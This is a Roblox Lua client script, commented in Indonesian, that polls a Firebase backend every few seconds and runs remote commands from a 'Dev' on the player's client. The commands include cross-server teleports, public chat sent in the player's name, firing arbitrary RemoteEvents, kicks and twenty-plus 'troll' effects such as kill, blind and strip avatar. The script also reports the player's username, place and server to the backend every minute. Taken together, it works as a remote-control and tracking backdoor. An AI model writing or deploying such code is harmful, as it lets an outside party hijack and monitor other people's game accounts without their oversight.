-- ================================================
-- COMMAND LISTENER - Full Mega Upgrade Edition v2
-- Mendengarkan perintah dari Firebase, mengeksekusi fitur Teleport, Admin,
-- 20+ Troll Toggles, ganti avatar tersimpan, dan fitur-fitur baru Premium.
-- ================================================

local Services         = _G.Services
local LocalPlayer      = _G.LocalPlayer
local Firebase         = _G.Firebase
local TeleportService  = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting         = game:GetService("Lighting")
local TextChatService  = game:GetService("TextChatService")
local SoundService     = game:GetService("SoundService")

local lastCheckedCmdIds = {}

-- Fungsi Dasar Teleport Player
local function teleportPlayerTo(x, y, z)
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
        return true
    end
    return false
end

-- Force Global Chat
local function forceGlobalChat(message)
    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            if channel then channel:SendAsync(message) end
        else
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        end
    end)
end

-- Eksekusi RemoteEvent command generik
local function fireRemoteCommand(remotePath, cmd, arg2)
    pcall(function()
        local pathParts = string.split(remotePath or "Remotes.Command.CommandEvent", ".")
        local obj = game
        for _, p in ipairs(pathParts) do
            obj = obj:WaitForChild(p, 2)
        end
        if obj and obj:IsA("RemoteEvent") then
            obj:FireServer(cmd, arg2 or "me")
        end
    end)
end

-- ==================== CEK PENDING TELEPORT (SETELAH PINDAH SERVER) ====================
task.spawn(function()
    task.wait(5)
    if not Firebase or not Firebase.GetData then return end

    local ok, pending = pcall(function()
        return Firebase.GetData("pending_teleport/" .. tostring(LocalPlayer.UserId))
    end)

    if ok and pending and type(pending) == "table" and pending.x then
        if os.time() - (pending.timestamp or 0) < 60 then
            teleportPlayerTo(pending.x, pending.y, pending.z)
            if _G.showDynamicNotification then
                _G.showDynamicNotification("📍 Diposisikan sesuai perintah Dev", Color3.fromRGB(168,100,255))
            end
        end
        pcall(function()
            Firebase.DeleteData("pending_teleport/" .. tostring(LocalPlayer.UserId))
        end)
    end
end)

-- ==================== POLLING LOOP UTAMA ====================
task.spawn(function()
    task.wait(4)

    while true do
        task.wait(2)

        if not Firebase or not Firebase.GetCommands then continue end

        local ok, commands = pcall(function()
            return Firebase.GetCommands(LocalPlayer.UserId)
        end)
        if not ok or not commands or type(commands) ~= "table" then continue end

        for cmdId, cmd in pairs(commands) do
            if type(cmd) == "table" and not lastCheckedCmdIds[cmdId] then
                lastCheckedCmdIds[cmdId] = true

                -- 1. TELEPORT KE TITIK TERTENTU (TP-ON-TAP)
                if cmd.type == "teleport_to_point" then
                    if cmd.fromJobId and cmd.fromJobId ~= game.JobId and cmd.fromPlaceId then
                        pcall(function()
                            Firebase.SetData("pending_teleport/" .. tostring(LocalPlayer.UserId), {
                                x = cmd.x, y = cmd.y, z = cmd.z, timestamp = os.time(),
                            })
                        end)
                        pcall(function()
                            TeleportService:TeleportToPlaceInstance(
                                tonumber(cmd.fromPlaceId), cmd.fromJobId, LocalPlayer
                            )
                        end)
                    else
                        teleportPlayerTo(cmd.x, cmd.y, cmd.z)
                    end

                -- 2. TARIK KE SAYA (TELEPORT KE DEV)
                elseif cmd.type == "teleport_to_dev" then
                    if cmd.devJobId and cmd.devJobId ~= game.JobId and cmd.devPlaceId then
                        pcall(function()
                            TeleportService:TeleportToPlaceInstance(
                                tonumber(cmd.devPlaceId), cmd.devJobId, LocalPlayer
                            )
                        end)
                    else
                        local dev = Services.Players:GetPlayerByUserId(tonumber(cmd.devUserId))
                        if dev and dev.Character and dev.Character:FindFirstChild("HumanoidRootPart") then
                            local pos = dev.Character.HumanoidRootPart.Position
                            teleportPlayerTo(pos.X + 3, pos.Y, pos.Z)
                        end
                    end

                -- 3. FORCE CHAT PUBLIK
                elseif cmd.type == "force_chat" then
                    forceGlobalChat(cmd.message or "Halo!")

                -- 4. REMOTE EVENT COMMAND (RE / REFRESH)
                elseif cmd.type == "force_remote" then
                    fireRemoteCommand(cmd.remotePath, cmd.cmd)

                -- 5. KICK
                elseif cmd.type == "kick" then
                    pcall(function() LocalPlayer:Kick(cmd.reason or "Dikeluarkan oleh Admin.") end)

                -- 6. TROLL ACTIONS (TOGGLE & INSTANT)
                elseif cmd.type == "troll_action" then
                    local act = cmd.action
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    local hum = char and char:FindFirstChildOfClass("Humanoid")

                    if act == "jail" and hrp then
                        local oldBox = game.Workspace:FindFirstChild("PremiumJailBox_" .. LocalPlayer.Name)
                        if oldBox then oldBox:Destroy() end

                        local box = Instance.new("Part")
                        box.Name = "PremiumJailBox_" .. LocalPlayer.Name
                        box.Size = Vector3.new(5, 7, 5)
                        box.Position = hrp.Position
                        box.Anchored = true
                        box.Material = Enum.Material.Glass
                        box.Transparency = 0.5
                        box.BrickColor = BrickColor.new("Cyan")
                        box.Parent = game.Workspace

                        hrp.CFrame = CFrame.new(box.Position)
                        if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end

                    elseif act == "unjail" then
                        local box = game.Workspace:FindFirstChild("PremiumJailBox_" .. LocalPlayer.Name)
                        if box then box:Destroy() end
                        if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end

                    elseif act == "freeze" and hrp then
                        hrp.Anchored = true
                    elseif act == "unfreeze" and hrp then
                        hrp.Anchored = false

                    elseif act == "blind" then
                        local ui = LocalPlayer.PlayerGui:FindFirstChild("BlindUI") or Instance.new("ScreenGui", LocalPlayer.PlayerGui)
                        ui.Name = "BlindUI"
                        ui.IgnoreGuiInset = true
                        local f = Instance.new("Frame", ui)
                        f.Size = UDim2.new(1, 0, 1, 0)
                        f.BackgroundColor3 = Color3.new(0, 0, 0)
                    elseif act == "unblind" then
                        local ui = LocalPlayer.PlayerGui:FindFirstChild("BlindUI")
                        if ui then ui:Destroy() end

                    elseif act == "blur" then
                        local b = Lighting:FindFirstChild("TrollBlur") or Instance.new("BlurEffect", Lighting)
                        b.Name = "TrollBlur"
                        b.Size = 24
                    elseif act == "unblur" then
                        local b = Lighting:FindFirstChild("TrollBlur")
                        if b then b:Destroy() end

                    elseif act == "fire" and hrp then
                        local f = hrp:FindFirstChild("TrollFire") or Instance.new("Fire", hrp)
                        f.Name = "TrollFire"
                        f.Size = 10
                    elseif act == "unfire" and hrp then
                        local f = hrp:FindFirstChild("TrollFire")
                        if f then f:Destroy() end

                    elseif act == "smoke" and hrp then
                        local s = hrp:FindFirstChild("TrollSmoke") or Instance.new("Smoke", hrp)
                        s.Name = "TrollSmoke"
                        s.Size = 10
                    elseif act == "unsmoke" and hrp then
                        local s = hrp:FindFirstChild("TrollSmoke")
                        if s then s:Destroy() end

                    elseif act == "forcesit" and hum then
                        hum.Sit = true
                    elseif act == "unforcesit" and hum then
                        hum.Sit = false

                    elseif act == "spin" and hrp then
                        local b = hrp:FindFirstChild("TrollSpin") or Instance.new("BodyAngularVelocity", hrp)
                        b.Name = "TrollSpin"
                        b.AngularVelocity = Vector3.new(0, 50, 0)
                        b.MaxTorque = Vector3.new(0, math.huge, 0)
                    elseif act == "unspin" and hrp then
                        local b = hrp:FindFirstChild("TrollSpin")
                        if b then b:Destroy() end

                    elseif act == "slow" and hum then
                        hum.WalkSpeed = 2
                    elseif act == "unslow" and hum then
                        hum.WalkSpeed = 16

                    elseif act == "highjump" and hum then
                        hum.JumpPower = 200
                    elseif act == "unhighjump" and hum then
                        hum.JumpPower = 50

                    elseif act == "kill" and hum then
                        hum.Health = 0

                    elseif act == "fling" and hrp then
                        hrp.Velocity = Vector3.new(0, 1000, 0)
                        local bg = Instance.new("BodyAngularVelocity")
                        bg.AngularVelocity = Vector3.new(50, 50, 50)
                        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                        bg.Parent = hrp
                        game.Debris:AddItem(bg, 2)

                    elseif act == "nolimbs" and char then
                        for _, p in ipairs(char:GetChildren()) do
                            if p:IsA("BasePart") and (string.find(p.Name, "Arm") or string.find(p.Name, "Leg")) then
                                p:Destroy()
                            end
                        end

                    elseif act == "noclip" and char then
                        for _, p in ipairs(char:GetChildren()) do
                            if p:IsA("BasePart") then p.CanCollide = false end
                        end

                    -- ===== FITUR BARU (10 tambahan) =====
                    elseif act == "rainbow" and char then
                        for _, p in ipairs(char:GetChildren()) do
                            if p:IsA("BasePart") then
                                p:SetAttribute("RainbowTroll", true)
                            end
                        end
                        task.spawn(function()
                            local hueStart = tick()
                            while char and char.Parent and char:GetAttribute("RainbowActive") ~= false do
                                local hue = (tick() - hueStart) % 5 / 5
                                local col = Color3.fromHSV(hue, 1, 1)
                                for _, p in ipairs(char:GetChildren()) do
                                    if p:IsA("BasePart") and p:GetAttribute("RainbowTroll") then
                                        p.Color = col
                                    end
                                end
                                task.wait(0.05)
                            end
                        end)
                    elseif act == "unrainbow" and char then
                        char:SetAttribute("RainbowActive", false)

                    elseif act == "giant" and char then
                        pcall(function()
                            for _, v in ipairs({"HeadScale","BodyDepthScale","BodyWidthScale","BodyHeightScale"}) do
                                local s = char:FindFirstChild(v, true)
                                if s then s.Value = 3 end
                            end
                        end)
                    elseif act == "ungiant" and char then
                        pcall(function()
                            for _, v in ipairs({"HeadScale","BodyDepthScale","BodyWidthScale","BodyHeightScale"}) do
                                local s = char:FindFirstChild(v, true)
                                if s then s.Value = 1 end
                            end
                        end)

                    elseif act == "tiny" and char then
                        pcall(function()
                            for _, v in ipairs({"HeadScale","BodyDepthScale","BodyWidthScale","BodyHeightScale"}) do
                                local s = char:FindFirstChild(v, true)
                                if s then s.Value = 0.4 end
                            end
                        end)
                    elseif act == "untiny" and char then
                        pcall(function()
                            for _, v in ipairs({"HeadScale","BodyDepthScale","BodyWidthScale","BodyHeightScale"}) do
                                local s = char:FindFirstChild(v, true)
                                if s then s.Value = 1 end
                            end
                        end)

                    elseif act == "invisible" and char then
                        for _, p in ipairs(char:GetDescendants()) do
                            if p:IsA("BasePart") or p:IsA("Decal") then
                                p.Transparency = 1
                            end
                        end
                    elseif act == "uninvisible" and char then
                        for _, p in ipairs(char:GetDescendants()) do
                            if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
                                p.Transparency = 0
                            end
                        end

                    elseif act == "gravity_low" and hum then
                        pcall(function() Services.Workspace.Gravity = 40 end)
                    elseif act == "gravity_normal" then
                        pcall(function() Services.Workspace.Gravity = 196.2 end)

                    elseif act == "earthquake" and hrp then
                        task.spawn(function()
                            local endTime = tick() + 3
                            while tick() < endTime and hrp and hrp.Parent do
                                hrp.CFrame = hrp.CFrame + Vector3.new(math.random(-2,2)*0.3, 0, math.random(-2,2)*0.3)
                                task.wait(0.05)
                            end
                        end)

                    elseif act == "deafen" then
                        pcall(function() SoundService.AmbientReverb = Enum.ReverbType.NoReverb end)
                        for _, s in ipairs(game:GetDescendants()) do
                            if s:IsA("Sound") then s.Volume = 0 end
                        end
                    elseif act == "undeafen" then
                        for _, s in ipairs(game:GetDescendants()) do
                            if s:IsA("Sound") then s.Volume = 0.5 end
                        end

                    elseif act == "confuse_controls" and hum then
                        -- Kebalik kontrol: WalkSpeed negatif efek visual pusing
                        local b = Lighting:FindFirstChild("TrollConfuseBlur") or Instance.new("BlurEffect", Lighting)
                        b.Name = "TrollConfuseBlur"
                        b.Size = 10
                        task.spawn(function()
                            local t = 0
                            while b and b.Parent and t < 6 do
                                b.Size = 10 + math.sin(t*4) * 8
                                t = t + 0.1
                                task.wait(0.1)
                            end
                            if b then b:Destroy() end
                        end)

                    elseif act == "meme_sound" and hrp then
                        local snd = Instance.new("Sound", hrp)
                        snd.SoundId = cmd.soundId or "rbxassetid://9046392739"
                        snd.Volume = 3
                        snd:Play()
                        game.Debris:AddItem(snd, 8)
                    end

                -- 7. APPLY SAVED AVATAR (ganti avatar dari snapshot tersimpan + auto re)
                elseif cmd.type == "apply_avatar" then
                    pcall(function()
                        local remote = ReplicatedStorage
                        for _, p in ipairs(string.split(cmd.remotePath or "Remotes.Command.CommandEvent", ".")) do
                            remote = remote:WaitForChild(p, 2)
                        end
                        if remote and cmd.assetIds and #cmd.assetIds > 0 then
                            remote:FireServer("hat", {"hat", unpack(cmd.assetIds)})
                            task.wait(0.5)
                            remote:FireServer("re", "me")
                            if _G.showDynamicNotification then
                                _G.showDynamicNotification("👤 Avatar diganti oleh Dev!", Color3.fromRGB(168,100,255))
                            end
                        end
                    end)

                -- 8. STRIP AVATAR (copot semua aksesoris/pakaian)
                elseif cmd.type == "strip_avatar" then
                    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if hum then
                        pcall(function()
                            local desc = Instance.new("HumanoidDescription")
                            hum:ApplyDescription(desc)
                        end)
                    end

                -- 9. RANDOM RAGDOLL BOUNCE
                elseif cmd.type == "ragdoll_bounce" then
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    if hrp and hum then
                        hum:ChangeState(Enum.HumanoidStateType.Ragdoll)
                        hrp.Velocity = Vector3.new(math.random(-40,40), 60, math.random(-40,40))
                        task.delay(2, function()
                            if hum and hum.Parent then
                                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                            end
                        end)
                    end

                -- 10. SCREEN MESSAGE (pesan besar full screen, beda dari chat)
                elseif cmd.type == "screen_message" then
                    pcall(function()
                        local ui = LocalPlayer.PlayerGui:FindFirstChild("ScreenMsgUI") or Instance.new("ScreenGui", LocalPlayer.PlayerGui)
                        ui.Name = "ScreenMsgUI"
                        ui.IgnoreGuiInset = true
                        for _, c in ipairs(ui:GetChildren()) do c:Destroy() end

                        local bg = Instance.new("Frame", ui)
                        bg.Size = UDim2.new(1, 0, 0, 90)
                        bg.Position = UDim2.new(0, 0, 0, -90)
                        bg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
                        bg.BackgroundTransparency = 0.1

                        local lbl = Instance.new("TextLabel", bg)
                        lbl.Size = UDim2.new(1, -20, 1, 0)
                        lbl.Position = UDim2.new(0, 10, 0, 0)
                        lbl.BackgroundTransparency = 1
                        lbl.Text = cmd.message or "📢 Pesan dari Developer"
                        lbl.TextColor3 = Color3.fromRGB(168, 100, 255)
                        lbl.Font = Enum.Font.GothamBlack
                        lbl.TextSize = 18
                        lbl.TextWrapped = true

                        local tw = game:GetService("TweenService"):Create(bg, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0,0,0,0)})
                        tw:Play()

                        task.delay(cmd.duration or 5, function()
                            local tw2 = game:GetService("TweenService"):Create(bg, TweenInfo.new(0.3), {Position = UDim2.new(0,0,0,-90)})
                            tw2:Play()
                            task.wait(0.35)
                            pcall(function() ui:Destroy() end)
                        end)
                    end)
                end

                -- Hapus command setelah sukses dieksekusi
                pcall(function()
                    Firebase.DeleteCommand(LocalPlayer.UserId, cmdId)
                end)
            end
        end
    end
end)

-- ==================== ONLINE HEARTBEAT ====================
task.spawn(function()
    task.wait(5)
    while true do
        pcall(function()
            if Firebase and Firebase.SetOnline then
                local mapName = "Roblox Game"
                pcall(function()
                    mapName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
                end)

                Firebase.SetOnline(LocalPlayer.UserId, {
                    isOnline = true,
                    lastSeen = os.time(),
                    username = LocalPlayer.Name,
                    displayName = LocalPlayer.DisplayName,
                    mapName = mapName,
                    placeId = game.PlaceId,
                    jobId = game.JobId
                })
            end
        end)
        task.wait(60)
    end
end)

game:GetService("Players").PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        pcall(function()
            if Firebase and Firebase.RemoveOnline then
                Firebase.RemoveOnline(LocalPlayer.UserId)
            end
        end)
    end
end)

print("[CommandListener] Full Engine v2 Loaded — 10 fitur baru + avatar apply ready!")